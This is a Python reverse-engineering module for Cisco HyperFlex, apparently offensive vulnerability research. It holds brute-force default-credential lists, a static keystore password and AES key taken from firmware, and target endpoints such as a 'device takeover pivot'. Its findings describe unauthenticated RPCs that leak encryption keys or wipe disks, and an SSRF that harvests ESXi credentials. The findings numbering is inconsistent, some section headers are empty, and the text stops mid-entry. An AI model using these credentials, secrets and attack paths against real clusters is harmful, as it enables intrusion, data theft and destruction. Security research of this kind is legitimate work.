"""
Cisco HyperFlex (HX Data Platform) — RE Module
Firmware corpus: HX-ESXi-7.0U1 through HX-ESXi-8.0U3 (install ISOs + upgrade bundles)
Architecture: Cisco-customized ESXi + stCtlVM (storage controller VM, Debian/Linux)

HyperFlex stack:
  ESXi host:   Cisco custom VIBs (hxdp-*, hx-*, springpath-*) — kernel drivers + agents
  stCtlVM:     Debian Linux VM — HX Data Platform storage stack (C++/Python/Go binaries)
               ports: 443 (HX Connect REST API), 8080 (internal), 9090 (Prometheus), 3260 (iSCSI)
  HX Connect:  HTTPS REST API — cluster management, node enrollment, Intersight claim
  UCSM:        UCS Manager XML API integration (port 443 on UCSM)
  vCenter:     Plugin integration (remote plugin OVA: HTML5-remote-plugin-Appliance-3.0.0-1173.ova)

Extraction method:
  ISO (iso9660) -> VIBs at /packages/*.vib -> .tgz -> payloads
  Upgrade bundles (.zip) -> VIBs directly
  stCtlVM: embedded as OVA or installer package inside VIBs

Default credentials (HX Connect REST API):
  POST /rest/v1/tokens {username, password} -> hx-auth-token
  Brute: admin/admin, admin/C1sco12345, admin/Cisco123, admin/HXpassword1!,
         hxadmin/C1sco12345, admin/Password1!, root/password1!, root/Cisco123,
         root/springpath, spadmin/springpath (IPMI: HX-F028)

Unauthenticated endpoints (HX Connect <4.5):
  GET /rest/v1/cluster  — cluster UUID, version, node count
  GET /rest/v1/version  — HXDP version string
  GET /rest/v1/about    — platform info

High-value authenticated endpoints:
  GET /rest/v1/nodes                        — node IPs, serial numbers, roles
  GET /rest/v1/intersight/connection        — Intersight claim code (device takeover pivot)
  GET /rest/v1/clusters/local/snapshots     — snapshot inventory
  GET /rest/v1/storage/disks               — disk topology + SN
  GET /rest/v1/cluster/security            — security config

Firmware corpus:
  storfs-packages-6.0.2b-44423.tgz — HXDP core packages (848MB)
  Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova — installer appliance (Ubuntu 64-bit, 24.8GB vdisk)
  cisco-hxdc_6.0.2b-44423_amd64.deb — Intersight Device Connector + image signing verifier
  cisco-openssl_1.1.1za_amd64.deb — private EOL OpenSSL fork + CiscoSSH replacement
  hx-iscsi_6.0.2b-44423_amd64.deb — iSCSI service (16MB ELF, not stripped)
  hx-os_6.0.2b-44423_amd64.deb — OS configs (auditd, iptables, syslog-ng)
  zookeeper_3.8.1_amd64.deb — distributed coordinator
  storfs-support-workflows-6.0.2b-44423.tgz — support debs + bootstrap workflow
  hxdp-connector bundle (inner): Go binary (UPX-packed, 25MB unpacked), version 1.0.11-20250305

Key services (from syslog-ng):
  storfs, iscsisvc, scvmclient, hxmanager, cip-monitor, replsvc, smbscvmclient, stmapper, networkMonitor
  hxmanager logs sent over TCP to syslog-ng localhost:514

Port topology (iptables_node_reset.rules):
  8092 — Springpath internal cluster bus (OUTPUT restricted to springpath/www-data)
  2003 — Graphite metrics (OUTPUT restricted to www-data)
  3260 — iSCSI (inbound from ESXi initiators)

Image signing (hxdc_release_img_verify, 32-bit ELF, not stripped):
  Cisco ROMMON code-sign library (cs_rommon_* functions — shared with IOS/NX-OS boot signing)
  RSA PKCS#1 + SHA-512; custom BigNum (RsaLibBigNum*), NOT OpenSSL
  Key storage: /opt/partner/cisco-hxdc/public-key (Cisco TLV format, multi-version with revocation)
  Bundle format: [gzip tar][440-byte Cisco RSA-3072 PKCS#1 signature]
  Dev keys: cs_rommon_platform_allow_dev_keys(0) called from main() — disabled in production

Auto-upgrade NFS path:
  Primary pushes bundle to /nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle
  Secondary nodes pull from NFS at startup; no NFS write-protection enforced in code

iscsisvc architecture (16MB PIE ELF, not stripped, statically compiled OpenSSL):
  Build path: /opt/git/cypress/opensrc/istgt/src/chap_util.c  (Cisco internal project "cypress")
  IoVisor: ESXi-side kernel driver (stHypervisorSvc VIB); iscsisvc manages IoVisor registrations
  Iscsi_RegisterIoVisor / Iscsi_GetRedirectionInfo / Iscsi_Redirect — connection redirect/LB
  Binary protections:
    PIE: YES (ELF Type DYN, FLAGS_1=PIE)
    ASLR: YES (PIE binary)
    Stack canaries: YES (__stack_chk_fail called extensively in all handlers)
    NX/DEP: YES (GNU_STACK RW, not executable)
    RELRO: PARTIAL (GNU_RELRO present, no BIND_NOW -> GOT remains writable post-load)
    Note: partial RELRO = GOT overwrite remains viable exploitation primitive if heap write-primitive found
  conn_worker_ev_pdu_exec (0x282130) — iSCSI PDU execution handler
    Stack frame: 264 bytes (sub rsp,0x108); opcode read at [rsi], masked to 6-bit via 'and eax,0x3f'
    Sequence validation: bswap r13d; compare against connection struct at [rbx+0x128]+0xdc/0xe0
    Pre-filter: bt rax,0x16 gates opcodes 0x01/0x02/0x04 through CmdSN seq validation before dispatch
    Non-filtered opcodes (0x00,0x03,0x05,0x06,0x10) bypass seq validation, checked at cmp al,0x5 first
    Jump table (relative offset, 4B entries): 0xb0bc6c; valid range opcodes 0x00-0x10; >0x10 -> error
      0x00 NOP-Out       -> 0x2828b0 (conn_worker_ev_nop_send echo path via nop_send/CB/CB2)
      0x01 SCSI Command  -> 0x282da8 -> istgt_iscsi_op_scsi (0x2751e0)
      0x02 SCSI Task Mgmt-> 0x282be0
      0x03 Login Request -> 0x282b80 -> istgt_iscsi_op_login (0x27c7e0)
      0x04 Text Request  -> 0x282b20 -> istgt_iscsi_op_text (0x26d360)
      0x05 SCSI Data-Out -> 0x282e40 (also 0x2830e0 pre-seq-check path)
      0x06 Logout Request-> 0x282e10
      0x07-0x0f reserved -> 0x282610 (error handler)
      0x10 SNACK Request -> 0x2825c8
  istgt_iscsi_op_login (0x27c7e0) — RFC 3720 Login PDU handler
    Stack frame: 2248 bytes (sub rsp,0x8c8); parses T-bit, CSG/NSG, ISID, TSIH, CmdSN, ExpStatSN
  istgt_iscsi_parse_params (0x29b990) — Text/Login key=value PDU data parser
    Key buffer: xmalloc(0x41) = 65 bytes; enforces key_len <= 64 (cmp r15d,0x40; jg error)
    Value buffer: xmalloc(0x2001) = 8193 bytes; enforces val_len <= 8192 (cmp r15d,0x2000; jg error)
    Bounds checked BEFORE copy — text negotiation parser is SAFE
  istgt_iscsi_op_data (0x276d60) — SCSI Data-Out handler
    DataSegmentLength: 24-bit from PDU bytes [5:7] (max 0xFFFFFF = 16MB)
    Bounds check at 0x276f37: rcx = BufferOffset + DataSegmentLength; cmp rcx, EDTL; ja error
    memcpy at 0x276f77: dst=task_buf+offset, src=PDU_data_ptr, size=DataSegmentLength — SAFE
  chap_decrypt_init (0x28ba30) / chap_decrypt_cleanup — CHAP (MD5) authentication
  CHAP credential infrastructure:
    ZooKeeper path: /chap/<initiator-iqn>  JSON: {chapName: <base64-ciphertext>, chapSecret: <base64-ciphertext>}
    Decrypt path (decrypt_data, 0x28bcf0):
      1. get_keystore_passwd (0x28b7e0): reads <entry key="keystore_password"> from
         /etc/hyperflex/secure/hyperflex_security.properties (fgets line scan)
      2. d2i_PKCS12_fp("/etc/hyperflex/secure/hyperflex_keystore.p12"): loads PKCS#12
      3. PKCS12_parse: extracts RSA private key
      4. BIO base64-decode ciphertext, then RSA_private_decrypt(0x100, ct, pt, key, RSA_PKCS1_PADDING=1)
    Both keystore and password file in same directory: /etc/hyperflex/secure/
  _add_dm_targets — dm-device mapper target manipulation
  PEM_write_PKCS8PrivateKey / crypt_keyslot_add_by_volume_key — LUKS integration
  AkvStor DEK cache: AkvStor->kvDEKCache->kvDataEncryptionKeys[dekIndex].isSet — in-memory LUKS key cache
  Encryption library toggle: /opt/hyperflex/storfs-core/encrypt/libcrypt_disabled.so vs libcrypt_enabled.so

hxdp connector binary (Go, UPX-packed, stripped):
  Internal project names: apollo (connector codebase), starship (HXDP), diesel (build system)
  Build server: /mnt/vol1/jenkins/workspace/starship/master/diesel/code/apollo/
  Intersight cloud WebSocket endpoint: svc-static1.ucs-connect.com
  HashiCorp Vault API paths embedded: /pki/root/sign-self-issued, /sys/revoke-force/{prefix}
  SUDI certificate authentication to Intersight
  Emulator mode path: /.device_connector_emulator/intersight/catalog/Version
  Go pprof endpoint: /debug/pprof/, /debug/pprof/cmdline, /debug/pprof/profile
  Cloud domain override env vars: ENV_ANDROMEDA_DOMAIN_NAME, ENV_SERVICE_DOMAIN_NAME, ENV_WEB_ELB_DOMAIN_NAME
  Staging Intersight domains (hardcoded in binary): cntcicd.starshipcloud.com, staging.starshipcloud.com,
    cntperf.starshipcloud.com, sretest.starshipcloud.com, cntqa.starshipcloud.com
  adsecret cipher library: adsecret_cipher.CipherIntf / adsecret.CipherMsg / adsecret.DecryptReq (AES-GCM)
  JWT: ECDSA (jwt/ecdsa.go source path embedded); stSSOMgr SSO service at localhost:9334
  Cert paths: certs/cisco-root-ca.pem; config: /etc/springpath/visorhost, /etc/springpath/stMgr.cfg
  Certificate: -----END+CERTIFICATE----- non-standard PEM footer variant present

Installer appliance filesystem (Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova, 24.2GB vdisk):
  Build: BUILD_ID=44423, BUILD_DATE=20251107, BUILD_TYPE=release, BUILD_RELEASE=6.0.2b
  /etc/hyperflex/secure/ (world-traversable, drwxr-xr-x):
    hyperflex_keystore.jceks  (rw-r--r--, 2700 bytes; Java JCEKS magic 0xCECECECE)
      Entry 1: aes_encryption (SecretKeyEntry — AES key for data-at-rest)
      Entry 2: vcenter_client (PrivateKeyEntry; CN=*.cisco.com, OU=Engineering; self-signed; valid until 2055; SHA512withRSA)
    hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties
      Content: <entry key="keystore_password">c3ByaW5ncGF0aA==</entry>  (base64 -> "springpath")
  nginx: conf.d + ngx_cisco_fips_module.so; server.key NOT pre-provisioned in installer (generated during deploy)
  /opt/hyperflex/auth/auth — ELF 64-bit, dynamically linked, NOT stripped (symbols available)
  auth.service: WorkingDirectory=/opt/hyperflex/auth; binds localhost:9334 (stSSOMgr)
  deployNodes.py: reads credentials.installer_passwd via parseEnvVariableTunes()
  stssoclient.py: thrift client to stSSOMgr on localhost:9334

iscsisvc SCSI path analysis:
  conn_worker_ev_nop_send (0x285f10): builds fixed NOP-In response (TTT=0xFFFFFFFF, opcode=0x20, F-bit)
    via istgt_iscsi_send_response — no echo of NOP-Out DataSegment data; SAFE
  istgt_iscsi_op_scsi (0x2751e0) EDTL handling (candidate — needs exploitation confirmation):
    EDTL = bswap([r15+0x14]) -> [rsp+0x20]
    Buffer adequacy check: lea eax,[rax+rsi*1+0x11000] at 0x2755b4 where rsi=EDTL (32-bit LEA)
    Overflow: EDTL=0xFFFFFFFF causes LEA to wrap -> cmp [r14+0x2e8],0x10FF passes for most pre-allocs
    On overflow: code proceeds with undersized buffer instead of triggering jl->0x276513 error path
    0x276513 error path: Log_UserAlert + return -1 (no dynamic realloc — fixed allocation only)
    Exploitation impact: depends on whether EDTL drives subsequent memory write (vs SCSI CDB xfer len)

auth binary (hx-auth, 9.5MB ELF, not stripped, /opt/hyperflex/auth/auth):
  Uses dgrijalva/jwt-go v4.0.0-preview1 (archived 2021-01, CVE-2020-26160 audience bypass)
  Binary contains: *jwt.signingMethodNone, *jwt.unsafeNoneMagicConstant — alg:none path compiled in
  JWT key (main.TokenSigningKey) in .bss, runtime-initialized — not hardcoded
  Service: stSSOMgr on localhost:9334, Gorilla mux v1.7.1, PAM integration via CGo

installerrestapi-1.0.0.war (60MB Java WAR, installer appliance):
  web.xml comment: "Disable AAA Authentication for installer rest api"
  SPBasicAuth (SSOBasicAuthImpl) + SPAuth (SSOAuthFilterImpl) filters commented out
  No <security-constraint> elements — entire /rest/* surface unauthenticated
  Endpoints: /rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*
  REST resources: BootstrapResource, DeploymentResource, VirtPlatformResource
  BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes, executeCommand,
                     runCommand, validateVcenterCredentials, getVcServerDetails, pings, getNodes
  DeploymentResource: getResponseFromHxdpRest(HxCredDetails, url), deployNodes, createCluster,
                      configInstaller, updateCatalog, checkDeployNodes
  Executor.executeCommand: prefix allowlist = {stcli, sysmtool, mkfs.storfs}; Runtime.exec(String[])
  pings(): Runtime.exec("timeout 1 ping -c 1 " + userInput) — BootstrapMethods #1 template confirmed
           Runtime.exec(String) tokenizes by whitespace; no shell invocation; argument injection only
  StorvisorFileUploader: /upload endpoint, multipart POST to /var/www/localhost/images/ (no auth)
  WebDownloader.trustAllHttpsCertificates(): TrustAllManager + always-valid HostnameVerifier installed
    globally via HttpsURLConnection.setDefaultSSLSocketFactory() — affects full installer JVM TLS stack
  SecurityConfigurationManager (singleton Enum): reads keystore_password from
    /etc/hyperflex/secure/hyperflex_security.properties -> Base64.getDecoder().decode() -> "springpath"
  HostCredentialsAccess(): connects to localhost Thrift + reads /etc/hyperflex/secure/root_file.pub
    .getUserName() / .getPassword() return EsxCredential.username / .password (ESXi host credentials)

ZooKeeper auth (zkClient.py / storfs-support/listzkdb.py):
  ZKClient.__enter__ auth token = "postEvent;" + cluster_uuid
  cluster_uuid source: /etc/hyperflex/clusteruuid
  ZK UUID auth scheme bypassed by GET /rest/v1/cluster (unauthenticated) -> cluster UUID field
  listzkdb.py uses paramiko.AutoAddPolicy() (SSH TOFU, no host key verification)
  Credentials logged in exception output: "Paramiko ssh connect exception: %s, host: %s user: %s password: %s"

vcCertificateUtilities.py:
  SpringpathVMWare.getServiceInstance_VCenter_SDK_Via_Certificate() -> uses vcenter_client RSA key from JCEKS (HX-F13)
  Confirms HX-F13 vCenter client cert is the live auth credential for vCenter management operations

Findings: HX-F01 (HIGH) through HX-F29 (HIGH).

storfs-restapi_6.0.2b-44423_amd64.deb (81MB) — 11 WARs on stCtlVM:
  auth, coreapi, securityservice, encryption, dataprotection, backupservice,
  hxupgrade, supportservice, iscsi, slservice, ROOT
  auth-1.0.0.war: ALL auth filters enabled (contrast: installer WAR HX-F001 disables them)
    web.xml filters: AuditFilter, SPPrivilegedAuth (SSOPrivilegeAuthImpl),
      SessionAuth (SessionCookieFilterImpl), KerberosAuth (KerberosFilterImpl),
      ServiceAccessAuth (ServiceAccessAuthFilterImpl), SPBasicAuth (SSOBasicAuthImpl),
      SPAuth (SSOAuthFilterImpl) — all mapped to /v1/*
  authfilter-1.0.0.jar (from dependencies.zip) implements filter classes:
    SSOPrivilegeAuthImpl: X-RootSessionID == /etc/hyperflex/secure/root_file.pub
      -> accepts X-LoggedInUser/X-Scope/X-RequestInitiator as identity (HX-F29)
    ServiceAccessAuthFilterImpl: short-circuits if Authenticated=True set upstream
    SSOBasicAuthImpl: standard Basic Auth validation path
    KerberosFilterImpl: Kerberos ticket path (Hyper-V hypervisor only)
    SessionCookieFilterImpl: session cookie path (ESXi hypervisor only)
  HxSecurity.getLocalSessionId(): reads /etc/hyperflex/secure/root_file.pub via FileInputStream
  AuthorizedApiServiceImpl.authorizedRequest() dispatch order:
    1. Authorization: Basic -> SSOManager.validateAuthHeaderForBasicToken()
    2. Authorization: Bearer -> SSOManager.validateAccessTokenConvertToJWT()
    3. No Authorization header -> SSOPrivilegeAuthImpl (X-RootSessionID check)
    4. If ESX: SessionCookieFilterImpl
    5. If HyperV: KerberosFilterImpl
    6. Fallback: SSOBasicAuthImpl

springpath_env_parse.py tunes credential encryption:
  AES-128-CBC; key = md5(Secret.class) as hex string = "1f6d13bcd7753f2d3b2e2da361b7afb5"
  Secret.class path: /usr/share/hyperflex/storfs-misc/Secret.class (firmware-embedded static file)
  Encrypted values stored in INI-format .tunes files:
    /opt/hyperflex/springpath_default.tunes (cluster-wide defaults)
    /opt/hyperflex/springpath_custom_cluster.tunes (cluster overrides)
    /opt/hyperflex/springpath_custom_node.tunes (per-node overrides)
  installer_passwd key: credentials.installer_passwd (read by deployNodes.py at startup)
  AES key is static across all deployments of same firmware version — any extract of firmware
  yields the key; no per-deployment key derivation.

stSSOMgr (auth binary at /opt/hyperflex/auth/auth, 9.5MB):
  Binds localhost:9334, TBinaryProtocol/TFramedTransport Thrift server (no auth)
  Interface: StSSOMgr.Client.getHypervHostCreds() -> JSON string:
    {"host": {"localadminusername": "<hyperv_admin>", "localadminusercred": "<base64_password>"}}
  Credential source: ZooKeeper (fetched and cached by auth service)
  Client (stssoclient.py): no authentication on Thrift connect; returns username + base64-decoded password

hxinstaller (Go binary, /opt/hyperflex/hxinstaller/installer, 15MB, debug info, not stripped):
  Source tree: bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/
  Source files: create_validate.go, deploy_validate.go, hypervBareMetal.go, hyperv.go,
                hypervisor.go, validate.go, validate_hyperv.go, validate_login.go,
                validate_serversIP.go, validate_ucsm.go, validate_vcenter.go
  SQLite embedded (github.com/mattn/go-sqlite3 + CGo); DB path: installer.db
  REST endpoints (gorilla mux, runtime-registered):
    /api/validate_login, /api/upload_catalog, /api/update_catalog, /api/bundle_details
    /api/validate_hyperv, /api/configInstaller, /api/catalog_version, /api/upload_catalog_version
    /api/configure_server_ports, /api/servers/{serial}/disassociate, /api/resolve_mgmthostname
    /api/restart, /api/servers, /api/config, /api/fields, /api/upload, /api/about
    /api/proxy, /api/reset, /api/tech_support/poll, /disassoc_hv-installer
    /rest/deployment/proxy?url=<target>  (explicit SSRF proxy)
    /rest/deployment/upgradeClusterJobUCSM, /rest/deployment/updateCatalog
    /rest/deployment/checkDeployNodesJob, /rest/validate/fqdn, /rest/validate/mgmthostname
  Accepts: hxAdminPassword, vCenterPassword, esxPassword, cimcPassword fields in request bodies
  Command execution: os/exec.Cmd — "Executing command :%s" log prefix
    genisoimage via /usr/bin/genisoimagemanagement: builds hypervisorConfigData.iso
    runOSInstallAndHypervConfig: OS install + Hyper-V network config execution path
"""

import socket
import ssl
import json
import urllib.request
import urllib.error
import urllib.parse
import os
import subprocess
from typing import Optional


# ─── Default Credentials ─────────────────────────────────────────────────────

# Keystore password — static across all deployments (base64 in hyperflex_security.properties)
HX_KEYSTORE_PASSWORD = "springpath"
HX_KEYSTORE_JCEKS    = "/etc/hyperflex/secure/hyperflex_keystore.jceks"
HX_KEYSTORE_P12      = "/etc/hyperflex/secure/hyperflex_keystore.p12"
HX_KEYSTORE_PROPS    = "/etc/hyperflex/secure/hyperflex_security.properties"

HX_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "C1sco12345"),
    ("admin", "Cisco123"),
    ("admin", "cisco"),
    ("admin", "HXpassword1!"),
    ("hxadmin", "C1sco12345"),
    ("admin", "Password1!"),
    ("root", "password1!"),
    ("root", "Cisco123"),
]

HX_CONNECT_PORT = 443
HX_UNAUTH_PATHS = [
    "/rest/v1/cluster",
    "/rest/v1/version",
    "/rest/v1/about",
]

HX_AUTH_PATHS = {
    "nodes":            "/rest/v1/nodes",
    "datastores":       "/rest/v1/datastores",
    "alarms":           "/rest/v1/alarms",
    "snapshots":        "/rest/v1/clusters/local/snapshots",
    "disks":            "/rest/v1/storage/disks",
    "volumes":          "/rest/v1/volumes",
    "intersight_conn":  "/rest/v1/intersight/connection",
    "network":          "/rest/v1/network",
    "security":         "/rest/v1/cluster/security",
}

ISCSI_PORT = 3260
NFS_PORT   = 2049

UCSM_CREDS = [
    ("admin", "admin"),
    ("admin", "cisco"),
    ("admin", "C1sco12345"),
    ("admin", "password"),
]


# ─── Findings ────────────────────────────────────────────────────────────────

FINDINGS = {

    "HX-F001": {
        "title": (
            "Unauthenticated DARE Key Thrift RPCs in storfs — "
            "Encryption Key Exfiltration and Replacement (CWE-306)"
        ),
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId (dedicated enc Thrift server thread)."
        ),
        "description": (
            "The storfs binary hosts a dedicated Apache Thrift server "
            "(stNonBlockingEncServer, TNonblockingServer) that exposes the StPlatformEnc service. "
            "The process_getDataEncryptionKeys handler parses the incoming Thrift request, "
            "calls readMessageEnd(), then immediately invokes the handler "
            "StPlatformEncDispatcher::getDataEncryptionKeys without any authentication check. "
            "The args struct StPlatformEnc_getDataEncryptionKeys_args contains no credential fields. "
            "A successful call returns an HxEncryptionData object containing all Data Encryption Keys "
            "(DEKs) for the cluster, which directly defeats the Data At Rest Encryption (DARE) feature. "
            "The dispatchCall implementation is pure string-comparison method routing with no "
            "Thrift-layer auth header validation. The server is started unconditionally by "
            "SysMgmt_InitInternal alongside the main sysmgmt Thrift server."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_getDataEncryptionKeys @ 0x9ade70",
            "dispatcher_fn": "StPlatformEncDispatcher::getDataEncryptionKeys @ 0xa2b9e0",
            "args_read_fn": "StPlatformEnc_getDataEncryptionKeys_args::read @ 0x9a7510",
            "args_struct": "StPlatformEnc_getDataEncryptionKeys_args (no auth fields in struct)",
            "return_type": "HxEncryptionData (vtable _ZTVN...16HxEncryptionDataE @ 0x10b7ba0)",
            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970",
            "server_start_fn": "StartNonBlockingEncServer @ 0x8c2910",
            "server_thread": "_ZL29sysmgmtNonBlockingEncThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "dispatch_fn": "StPlatformEncProcessor::dispatchCall @ 0x9af4f0 — string-match dispatch, no auth",
            "kv_key_fn": "KVGetDataEncryptionKey @ 0x61a8d0 (lower-level ZK/KV key retrieval)",
            "auth_check": "NONE — no authentication before handler dispatch confirmed in disasm",
        },
        "versions_affected": ["6.0.2b-44423", "5.5.2b-43453"],
        "version_note": "5.5.2b confirmed: StPlatformEnc_getDataEncryptionKeys_* Thrift class names present in storfs binary",
        "remediation": (
            "Bind stNonBlockingEncServer to 127.0.0.1 only. "
            "Add a caller-identity verification step at the Thrift dispatch layer "
            "(TLS mutual auth or a pre-dispatch token check). "
            "If the StPlatformEnc service must remain a Thrift interface, require a session token "
            "verified against the hx-auth service before returning DEK material. "
            "Consider replacing the Thrift enc interface with a Unix-domain socket accessible "
            "only to root-owned processes."
        ),
    },
    "HX-F002": {
        "title": "Unauthenticated StPlatform Thrift Interface — 180 Cluster Management Operations Exposed (CWE-306)",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformProcessor. "
            "Server: sysmgmtNonBlockingServer (TNonblockingServer, started by SysMgmt_InitInternal). "
            "Service IDL: com.storvisor.sysmgmt.StPlatform."
        ),
        "description": (
            "The main StPlatform Apache Thrift service in storfs exposes 180 cluster management "
            "methods without any Thrift-layer authentication. The dispatchCall implementation "
            "(StPlatformProcessor::dispatchCall) routes exclusively by method name string comparison "
            "with no preceding token or credential check. Confirmed by disassembly of "
            "process_formatDisks @ 0x9947d0: RTTI type check, args parse, readMessageEnd, "
            "handler call, no auth. "
            "Any caller that can reach the Thrift server port can invoke any of these operations. "
            "The most destructive accessible methods include: formatDisks, shutdownCluster, "
            "deleteDatastore, deleteDatastoreSnapshots, removeNode, removeDisk, clusterUpgrade, "
            "enableZKAuth, resetZkConnectionString, setPlatformClusterAccessPolicy, "
            "setPlatformMaintenanceMode, blacklistDisks, retireDisks, unclaimDisks, "
            "revertDatastoreSnapshot, teardownNRNFS, setDataWriteThru."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "confirmed_handler": "process_formatDisks @ 0x9947d0 (same auth-less pattern as HX-F001)",
            "dispatch_fn": "StPlatformProcessor::dispatchCall — string-match routing, no auth gate",
            "server_start_fn": "StartNonBlockingServer @ 0x8c27e0",
            "server_thread": "_ZL26sysmgmtNonBlockingThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "total_methods": "180 process_* handlers in StPlatformProcessor (6.0.2b: nm --demangle | grep StPlatformProcessor::process_ | wc -l = 180)",
            "destructive_methods": [
                "formatDisks — format all drives, destroys all data",
                "shutdownCluster — immediate cluster shutdown (DoS)",
                "deleteDatastore / deleteDatastoreSnapshots — datastore destruction",
                "deleteFiles — arbitrary file deletion",
                "removeNode / removeDisk — cluster topology modification",
                "clusterUpgrade — trigger upgrade with attacker-controlled version map",
                "enableZKAuth / resetZkConnectionString — ZooKeeper state manipulation",
                "setPlatformClusterAccessPolicy — modify cluster access policies",
                "setPlatformMaintenanceMode — partial DoS via forced maintenance",
                "blacklistDisks / retireDisks / unclaimDisks — disk eviction",
                "revertDatastoreSnapshot — rollback data to arbitrary snapshot",
                "teardownNRNFS — tear down NFS replication",
                "setDataWriteThru — toggle write-through caching",
            ],
            "read_only_methods_also_exposed": [
                "getCluster, getNodes, getDisks, getDatastores — topology enumeration",
                "getClusterStats, getCleanerStats, getEnospaceInfo — metrics leak",
                "getAboutInfo — version/build disclosure",
            ],
        },
        "versions_affected": ["6.0.2b-44423", "5.5.2b-43453"],
        "version_note": "5.5.2b confirmed: same Thrift class symbols in storfs binary; KVGetDataEncryptionKey present",
        "remediation": (
            "Bind the StPlatform Thrift server to 127.0.0.1 only. "
            "Add pre-dispatch authentication at the TNonblockingServer level using a shared secret "
            "or mutual TLS. For write-path methods (formatDisks, deleteDatastore, etc.), require "
            "a session token from hx-auth before the handler is invoked. "
            "For cluster-level destructive operations (formatDisks, shutdownCluster, removeNode), "
            "require explicit operator confirmation via a separate signed request channel."
        ),
    },

    "HX-F003": {
        "title": "Unauthenticated SSRF + ESXi Credential Exfiltration via /st-support/* (StorvisorSupportBundle)",
        "severity": "CRITICAL",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorvisorSupportBundle. "
            "Mapped to /st-support/* with NO auth filter. "
            "web.xml: servlet-mapping present for /st-support/*, filter-mapping covers only "
            "/rest/*, /internalsupport/*, /upload/*, /v1/* — /st-support/* has zero filter coverage."
        ),
        "description": (
            "StorvisorSupportBundle handles /st-support/* with no authentication filter in the "
            "Servlet filter chain. The servlet accepts a ?host=<ip> array parameter, constructs "
            "a HostCredentialsAccess object to read stored ESXi credentials from "
            "com/storvisor/sysmgmt/EsxCredential (username and password fields), then calls "
            "WebDownloader.getStream(url_with_host_param, username, password) using those credentials "
            "against the attacker-supplied host. The response is returned as a ZIP download. "
            "An unauthenticated attacker can: (1) supply an arbitrary host and observe whether the "
            "cluster's stored ESXi credentials are valid against attacker-controlled targets "
            "(credential harvest via SSRF), and (2) proxy the credential usage against any host "
            "reachable from the stCtlVM. "
            "The auth filter gap is structural: web.xml defines filter-mappings for /rest/*, "
            "/internalsupport/*, /upload/*, and /v1/* only. The /st-support/* path is never covered."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorvisorSupportBundle",
            "url_pattern": "/st-support/*",
            "credential_source": "HostCredentialsAccess -> EsxCredential.username + EsxCredential.password",
            "ssrf_sink": "WebDownloader.getStream(url_with_host_param, username, password)",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/st-support/* has no filter-mapping entry — zero auth coverage."
            ),
            "parameter": "?host=<ip> (array of host IPs, attacker-controlled)",
            "output": "ZIP of support bundle fetched from supplied host using stored ESXi credentials",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /st-support/* to the HX Connect auth filter chain in web.xml. "
            "Validate that the host parameter matches a whitelist of known cluster node IPs. "
            "Audit all stored ESXi credential usage paths for similar unfiltered servlet coverage."
        ),
    },






    # ── HX-F54 ──────────────────────────────────────────────────────────────────

    # ── HX-F006 ──────────────────────────────────────────────────────────────────




    # ── HX-F60 ──────────────────────────────────────────────────────────────────

    # ── HX-F61 ──────────────────────────────────────────────────────────────────



    "HX-F004": {
        "title": (
            "HXCertificateZKMonitor Overwrites NGINX TLS Certificate and Private Key from "
            "ZooKeeper Path /certificates/hxcertificate — Unauthenticated ZK Write Enables "
            "MITM of All HTTPS Management Traffic with Explicit SFI Suppression"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXCertificateZKMonitor / writeSslCert + writeSslKey + restartNginx / "
            "/etc/nginx/server.crt + /etc/nginx/server.key"
        ),
        "class": "Unauthenticated ZK Write Replaces nginx TLS Cert/Key + Suppresses Integrity Check",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXCertificateZKMonitor.registerNodeCacheListener(): "
                "zkClient.registerNodeCacheListenerForPath('/certificates/hxcertificate', $1). "
                "NodeCache watcher fires on any ZK data change to /certificates/hxcertificate."
            ),
            "nodeChanged_chain": (
                "HXCertificateZKMonitor$1.nodeChanged() at offset 28-87: "
                "zkClient.getDataInPath('/certificates/hxcertificate', Type<HxCertificate>) -> hxCert; "
                "writeSslCert(hxCert.getCertificateString()); "
                "writeSslKey(hxCert.getPrivateKeyString()); "
                "restartNginx()."
            ),
            "writeSslCert_direct_write": (
                "writeSslCert(String) at offsets 0-56: "
                "File(NGINX_CERT_PATH).setReadable(true, false); "
                "PrintWriter(NGINX_CERT_PATH, 'UTF-8').print(zkData); // direct unvalidated write "
                "NGINX_CERT_PATH = '/etc/nginx/server.crt' (from application.conf nginx.CertificatePath)."
            ),
            "writeSslKey_direct_write": (
                "writeSslKey(String): analogous to writeSslCert. "
                "NGINX_KEY_PATH = '/etc/nginx/server.key' (from application.conf nginx.PrivateKeyPath)."
            ),
            "sfi_suppression": (
                "After restartNginx() at offset 90: "
                "logger.warn('Supressed SFI - Baseline Update for System File Integrity is Skipped!'). "
